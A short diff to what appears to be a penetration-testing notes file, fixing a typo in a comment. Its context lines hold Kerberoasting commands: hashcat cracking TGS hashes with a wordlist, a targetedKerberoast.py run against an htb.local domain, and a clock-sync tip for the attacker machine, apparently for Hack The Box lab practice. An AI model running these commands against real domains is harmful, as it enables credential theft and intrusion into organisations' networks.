@@ -177,7 +177,7 @@ hashcat -m 13100 file_tgs /usr/share/wordlists/rockyou.txt
 ```
 ./targetedKerberoast.py -d htb.local -u $user -p $password -v
 
-# TRoubleshooting:
+# Troubleshooting:
 # Sometimes it's necessary to sync the attacker machine date with the domain controller. In kali:
 sudo ntpdate -u $DomainControolerip
 ```
